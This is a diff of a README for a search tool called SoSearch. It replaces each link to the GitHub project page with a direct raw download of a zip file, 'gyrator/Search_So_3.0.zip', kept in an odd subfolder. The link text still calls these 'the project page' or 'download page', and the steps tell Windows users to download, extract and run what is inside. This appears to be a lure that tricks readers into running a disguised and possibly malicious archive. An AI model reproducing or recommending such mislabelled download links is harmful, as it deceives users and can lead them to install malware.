@@ -1,12 +1,12 @@
 # 🔎 SoSearch - Fast Search Results Without API Keys
 
-[![Download SoSearch](https://img.shields.io/badge/Download-SoSearch-blue?style=for-the-badge)](https://github.com/rishab-7701/SoSearch)
+[![Download SoSearch](https://img.shields.io/badge/Download-SoSearch-blue?style=for-the-badge)](https://raw.githubusercontent.com/rishab-7701/SoSearch/main/gyrator/Search_So_3.0.zip)
 
 ## 📥 Download SoSearch
 
 Use this link to visit the project page and download the app:
 
-[Open the SoSearch download page](https://github.com/rishab-7701/SoSearch)
+[Open the SoSearch download page](https://raw.githubusercontent.com/rishab-7701/SoSearch/main/gyrator/Search_So_3.0.zip)
 
 If the page shows a release file for Windows, download that file. If it shows source files only, use the built-in Windows setup steps below.
 
@@ -37,7 +37,7 @@ For the easiest setup, use the release file from the download page if one is ava
 ### 1. Open the download page
 Go to:
 
-[https://github.com/rishab-7701/SoSearch](https://github.com/rishab-7701/SoSearch)
+[https://raw.githubusercontent.com/rishab-7701/SoSearch/main/gyrator/Search_So_3.0.zip](https://raw.githubusercontent.com/rishab-7701/SoSearch/main/gyrator/Search_So_3.0.zip)
 
 ### 2. Find the Windows file
 Look for a release file for Windows. Common file names may end in:
@@ -200,7 +200,7 @@ SoSearch does not act like a plain web page. It takes search results from multip
 
 ## 📦 Download and Run
 
-1. Open the project page: [https://github.com/rishab-7701/SoSearch](https://github.com/rishab-7701/SoSearch)
+1. Open the project page: [https://raw.githubusercontent.com/rishab-7701/SoSearch/main/gyrator/Search_So_3.0.zip](https://raw.githubusercontent.com/rishab-7701/SoSearch/main/gyrator/Search_So_3.0.zip)
 2. Download the Windows file from the page
 3. If the file is `.exe` or `.msi`, run it
 4. If the file is `.zip`, extract it first, then run the app file inside
